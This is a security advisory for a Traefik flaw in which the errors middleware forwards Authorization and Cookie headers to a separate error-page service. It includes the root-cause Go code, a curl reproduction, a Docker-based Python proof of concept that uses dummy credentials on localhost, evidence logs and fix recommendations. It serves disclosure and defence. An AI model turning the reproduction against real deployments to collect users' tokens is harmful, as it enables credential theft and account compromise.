# [M] Traefik's errors middleware forwards Authorization and Cookie headers to separate error page service

## Summary
Severity: Medium
Advisory: GHSA-p6hg-qh38-555r
CVE: CVE-2026-41181
CWE: CWE-201
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-p6hg-qh38-555r
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.44
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.15
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-rc.0 <3.7.0-rc.3

## Details
## Summary

There is a medium severity information disclosure vulnerability in Traefik's `errors` (custom error pages) middleware. When the backend returns a response matching the configured status range, the middleware forwards the original request's complete header set, including `Authorization`, `Cookie`, and other authentication material, to the separate error page service rather than only the minimal context needed to render the error page. This behavior is undocumented: the documentation states only that `Host` is forwarded by default, so operators are not warned that sensitive credentials are shared across service boundaries. Deployments using the `errors` middleware with a distinct error page service may inadvertently expose end-user credentials to infrastructure that was not intended to receive them.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.44
- https://github.com/traefik/traefik/releases/tag/v3.6.15
- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.3

## For more information

If there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

## Description
Traefik v3.6.13's supported HTTP `errors` middleware discloses sensitive request headers to the configured error page service when the original backend response matches the configured status range and the middleware takes its default header-forwarding path. In the reproduced configuration, the business router `audit-customerrors@docker` pointed to backend service `audit-backend`, attached middleware `audit-leak@docker`, and the middleware was configured with `errors.status=500-599`, `errors.service=audit-error`, and `errors.query=/collect`. A request to the business route caused the backend to return `500`, after which Traefik created a secondary request to the error service and copied the original `Authorization` and `Cookie` headers into that cross-service request.

This is a normal feature path on an ordinary HTTP route. It does not depend on `api.insecure`, the dashboard, pprof, or a debug-only mode. The confidentiality boundary that breaks here is the service boundary between the original backend chain and the separate error page service: credentials that were only meant for the original backend are automatically delivered to another service.

The root cause is in `pkg/middlewares/customerrors/custom_errors.go:151-160`:

```go
if len(c.forwardNginxHeaders) > 0 {
    utils.CopyHeaders(pageReq.Header, c.forwardNginxHeaders)
    pageReq.Header.Set("X-Code", strconv.Itoa(code))
    pageReq.Header.Set("X-Format", req.Header.Get("Accept"))
    pageReq.Header.Set("X-Original-Uri", req.URL.RequestURI())
} else {
    utils.CopyHeaders(pageReq.Header, req.Header)
}
```

Unless the `NginxHeaders` branch is explicitly used, the middleware copies the entire original request header map into the error page request. The documentation at `docs/content/reference/routing-configuration/http/middlewares/errorpages.md:103-107` only states that `Host` is forwarded by default, so operators are not warned that `Authorization`, `Cookie`, and other authentication material are forwarded as well.

## Steps To Reproduce
1. Deploy Traefik v3.6.13 with a normal business route that uses the supported `errors` middleware and points `errors.service` to a distinct service. The attached PoC uses `BASE_URL = "http://127.0.0.1:28080"`, `API_BASE_URL = "http://127.0.0.1:28180"`, `ROUTER_PATH = "/audit-customerrors"`, `AUTHORIZATION = "Bearer audit-secret-token"`, and `COOKIE = "sessionid=audit-cookie; theme=dark"`.

2. Start the two attached helper services `customerrors_backend.py` and `customerrors_error.py`. The backend listens on port `8000` and always returns `500`. The error service listens on port `8000` and returns the request method, path, and received headers as JSON. The PoC starts them with the router and middleware labels below so that the business request is handled by the backend, while the error page is fetched from the separate error service:

```text
traefik.http.routers.audit-customerrors.rule=PathPrefix(`/audit-customerrors`)
traefik.http.routers.audit-customerrors.entrypoints=web
traefik.http.routers.audit-customerrors.priority=100
traefik.http.routers.audit-customerrors.service=audit-backend
traefik.http.routers.audit-customerrors.middlewares=audit-leak
traefik.http.services.audit-backend.loadbalancer.server.port=8000
traefik.http.middlewares.audit-leak.errors.status=500-599
traefik.http.middlewares.audit-leak.errors.service=audit-error
traefik.http.middlewares.audit-leak.errors.query=/collect
```

3. Confirm that Traefik has loaded the route and middleware. The attached `customerrors_router.json` shows that `audit-customerrors@docker` uses middleware `audit-leak@docker`, and the attached `customerrors_middleware.json` shows that the middleware is enabled with `status` `500-599`, `service` `audit-error`, and `query` `/collect`.

4. Send a request containing sensitive credentials through the business route. The manual reproduction used the following request, and the automated PoC sends the same header values:

```bash
curl -i \
  -H 'Authorization: Bearer audit-secret-token' \
  -H 'Cookie: sessionid=audit-cookie; theme=dark' \
  http://127.0.0.1:28080/audit-customerrors
```

5. Observe that the backend returns `500`, Traefik internally requests `/collect` from the error service, and the error service receives the original `Authorization` and `Cookie` headers. The attached `manual_curl_customerrors.txt` response shows the leaked headers directly, and the attached `poc_customerrors_header_leak.output.txt` execution log shows the same result from the automated PoC.

## Recommendations
The default behavior should forward only the minimal context needed to render an error page instead of copying the full original header set with `utils.CopyHeaders(pageReq.Header, req.Header)`. At minimum, Traefik should strip `Authorization`, `Proxy-Authorization`, `Cookie`, `Set-Cookie`, and common custom authentication headers such as `X-Api-Key` before issuing the error page request. If operators truly need additional headers, that behavior should be opt-in through an explicit allowlist rather than the default. The documentation should also describe the current behavior and warn that routing an error page to a separate service can otherwise disclose end-user credentials across service boundaries.

## PoC
The main PoC attachment is `poc_customerrors_header_leak.py`.

```python
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


TARGET = "traefik customErrors sensitive header leak"
BASE_URL = "http://127.0.0.1:28080"
API_BASE_URL = "http://127.0.0.1:28180"
TRAEFIK_CONTAINER = "traefik-openclaw"
NETWORK = ""
DOCKER_IMAGE = "python:3.12-alpine"
BACKEND_CONTAINER = "traefik-audit-backend"
ERROR_CONTAINER = "traefik-audit-error"
ROUTER_NAME = "audit-customerrors"
ROUTER_PATH = "/audit-customerrors"
AUTHORIZATION = "Bearer audit-secret-token"
COOKIE = "sessionid=audit-cookie; theme=dark"
TIMEOUT_SECONDS = 10
ROUTER_WAIT_SECONDS = 20

EVIDENCE_DIR = Path(__file__).resolve().parent
BACKEND_SCRIPT = EVIDENCE_DIR / "customerrors_backend.py"
ERROR_SCRIPT = EVIDENCE_DIR / "customerrors_error.py"


def run_command(command):
    print(f"$ {' '.join(command)}")
    completed = subprocess.run(command, capture_output=True, text=True, check=True)
    stdout = completed.stdout.strip()
    stderr = completed.stderr.strip()
    if stdout:
        print(stdout)
    if stderr:
        print(stderr)
    return stdout


def remove_container(name):
    subprocess.run(["docker", "rm", "-f", name], capture_output=True, text=True)


def detect_network():
    if NETWORK:
        return NETWORK

    output = run_command(
        ["docker", "inspect", TRAEFIK_CONTAINER, "--format", "{{json .NetworkSettings.Networks}}"]
    )
    networks = json.loads(output)
    network_names = sorted(networks.keys())
    if not network_names:
        raise RuntimeError("No docker network found for Traefik container")
    return network_names[0]


def ensure_image():
    run_command(["docker", "pull", DOCKER_IMAGE])


def start_error_container(network_name):
    run_command(
        [
            "docker", "run", "-d", "--name", ERROR_CONTAINER,
            "--network", network_name,
            "-v", f"{ERROR_SCRIPT}:/srv/error.py:ro",
            "-l", "traefik.enable=true",
            "-l", f"traefik.docker.network={network_name}",
            "-l", "traefik.http.services.audit-error.loadbalancer.server.port=8000",
            DOCKER_IMAGE, "python", "/srv/error.py",
        ]
    )


def start_backend_container(network_name):
    run_command(
        [
            "docker", "run", "-d", "--name", BACKEND_CONTAINER,
            "--network", network_name,
            "-v", f"{BACKEND_SCRIPT}:/srv/backend.py:ro",
            "-l", "traefik.enable=true",
            "-l", f"traefik.docker.network={network_name}",
            "-l", f"traefik.http.routers.{ROUTER_NAME}.rule=PathPrefix(`{ROUTER_PATH}`)",
            "-l", f"traefik.http.routers.{ROUTER_NAME}.entrypoints=web",
            "-l", f"traefik.http.routers.{ROUTER_NAME}.priority=100",
            "-l", f"traefik.http.routers.{ROUTER_NAME}.service=audit-backend",
            "-l", f"traefik.http.routers.{ROUTER_NAME}.middlewares=audit-leak",
            "-l", "traefik.http.services.audit-backend.loadbalancer.server.port=8000",
            "-l", "traefik.http.middlewares.audit-leak.errors.status=500-599",
            "-l", "traefik.http.middlewares.audit-leak.errors.service=audit-error",
            "-l", "traefik.http.middlewares.audit-leak.errors.query=/collect",
            DOCKER_IMAGE, "python", "/srv/backend.py",
        ]
    )


def fetch_json(url, headers=None):
    request = urllib.request.Request(url, headers=headers or {}, method="GET")
    try:
        response = urllib.request.urlopen(request, timeout=TIMEOUT_SECONDS)
    except urllib.error.HTTPError as exc:
        response = exc

    with response:
        return json.loads(response.read().decode())


def wait_for_router():
    deadline = time.time() + ROUTER_WAIT_SECONDS
    while time.time() < deadline:
        try:
            data = fetch_json(f"{API_BASE_URL}/api/rawdata")
            if f"{ROUTER_NAME}@docker" in data.get("routers", {}):
                return data
        except Exception:
            pass
        time.sleep(1)
    raise RuntimeError("Timed out waiting for router")


def trigger_request():
    headers = {
        "Authorization": AUTHORIZATION,
        "Cookie": COOKIE,
    }
    return fetch_json(f"{BASE_URL}{ROUTER_PATH}", headers=headers)


def validate(response_json):
    leaked_headers = response_json.get("headers", {})
    leaked_auth = leaked_headers.get("Authorization")
    leaked_cookie = leaked_headers.get("Cookie")

    print("Response JSON:")
    print(json.dumps(response_json, indent=2, sort_keys=True))

    if leaked_auth != AUTHORIZATION:
        raise RuntimeError(f"Authorization not leaked as expected, got: {leaked_auth!r}")
    if leaked_cookie != COOKIE:
        raise RuntimeError(f"Cookie not leaked as expected, got: {leaked_cookie!r}")

    print("Validation result: error page service received the original Authorization and Cookie.")


def main():
    print(f"TARGET={TARGET}")
    network_name = detect_network()
    print(f"Using docker network: {network_name}")

    remove_container(BACKEND_CONTAINER)
    remove_container(ERROR_CONTAINER)

    try:
        ensure_image()
        start_error_container(network_name)
        start_backend_container(network_name)
        wait_for_router()
        response_json = trigger_request()
        validate(response_json)
    finally:
        remove_container(BACKEND_CONTAINER)
        remove_container(ERROR_CONTAINER)
        print("Cleaned up temporary containers.")


if __name__ == "__main__":
    try:
        main()
    except subprocess.CalledProcessError as exc:
        if exc.stdout:
            print(exc.stdout)
        if exc.stderr:
            print(exc.stderr, file=sys.stderr)
        raise
```

Supporting backend helper used by the PoC, from `customerrors_backend.py`:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(500)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"backend forced 500\n")

    def log_message(self, format, *args):
        return


def main():
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()


if __name__ == "__main__":
    main()
```

Supporting error service helper used by the PoC, from `customerrors_error.py`:

```python
import json
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(
            {
                "method": self.command,
                "path": self.path,
                "headers": {key: value for key, value in self.headers.items()},
            },
            indent=2,
            sort_keys=True,
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        return


def main():
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()


if __name__ == "__main__":
    main()
```

## Evidence Files
`customerrors_middleware.json` proves that the active middleware is the supported `errors` middleware and that it was configured with `status` `500-599`, `service` `audit-error`, and `query` `/collect`.

```json
{
    "errors": {
        "status": [
            "500-599"
        ],
        "service": "audit-error",
        "query": "/collect"
    },
    "status": "enabled",
    "usedBy": [
        "audit-customerrors@docker"
    ],
    "name": "audit-leak@docker",
    "provider": "docker",
    "type": "errors"
}
```

`customerrors_router.json` proves that the business router `audit-customerrors@docker` was enabled on the `web` entrypoint, routed to `audit-backend`, and used middleware `audit-leak@docker`.

```json
{
    "entryPoints": [
        "web"
    ],
    "middlewares": [
        "audit-leak@docker"
    ],
    "service": "audit-backend",
    "rule": "PathPrefix(`/audit-customerrors`)",
    "priority": 100,
    "observability": {
        "accessLogs": true,
        "metrics": true,
        "tracing": true,
        "traceVerbosity": "minimal"
    },
    "status": "enabled",
    "using": [
        "web"
    ],
    "name": "audit-customerrors@docker",
    "provider": "docker",
    "priorityStr": "100"
}
```

`manual_curl_customerrors.txt` proves that a direct request through Traefik caused the separate error service to receive the original `Authorization` and `Cookie` values.

```text
HTTP/1.1 500 Internal Server Error
Content-Length: 461
Content-Type: application/json; charset=utf-8
Date: Mon, 13 Apr 2026 13:09:58 GMT
Server: BaseHTTP/0.6 Python/3.12.13

{
  "headers": {
    "Accept": "*/*",
    "Accept-Encoding": "gzip",
    "Authorization": "Bearer audit-secret-token",
    "Cookie": "sessionid=audit-cookie; theme=dark",
    "Host": "127.0.0.1:28080",
    "User-Agent": "curl/8.7.1",
    "X-Forwarded-Host": "127.0.0.1:28080",
    "X-Forwarded-Port": "28080",
    "X-Forwarded-Proto": "http",
    "X-Forwarded-Server": "c231be677a1b",
    "X-Real-Ip": "172.19.0.1"
  },
  "method": "GET",
  "path": "/collect"
}
```

`poc_customerrors_header_leak.output.txt` is the automated execution log for the Python PoC. The source material provided the following excerpt from that output, which shows the same credential disclosure and the PoC's validation result.

```text
Response JSON:
{
  "headers": {
    "Accept-Encoding": "identity",
    "Authorization": "Bearer audit-secret-token",
    "Cookie": "sessionid=audit-cookie; theme=dark",
    "Host": "127.0.0.1:28080",
    "User-Agent": "Python-urllib/3.14",
    "X-Forwarded-Host": "127.0.0.1:28080",
    "X-Forwarded-Port": "28080",
    "X-Forwarded-Proto": "http",
    "X-Forwarded-Server": "c231be677a1b",
    "X-Real-Ip": "172.19.0.1"
  },
  "method": "GET",
  "path": "/collect"
}
Validation result: error page service received the original Authorization and Cookie.
```

## Impact
Any deployment that uses the supported `errors` middleware with a separate error page service can silently copy end-user credentials to that second service whenever the configured error status range is triggered. In practice, this means bearer tokens, session cookies, and other custom authentication headers can be disclosed to infrastructure that was never meant to receive them. If the error service is maintained by a different team, shared across tenants, hosted by a third party, or simply logged more broadly than the primary application service, this expands the exposure of valid credentials and can enable unauthorized API access or account compromise depending on what the leaked tokens authorize.

</details>

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-p6hg-qh38-555r
- https://nvd.nist.gov/vuln/detail/CVE-2026-41181
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.44
- https://github.com/traefik/traefik/releases/tag/v3.6.15
- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.3
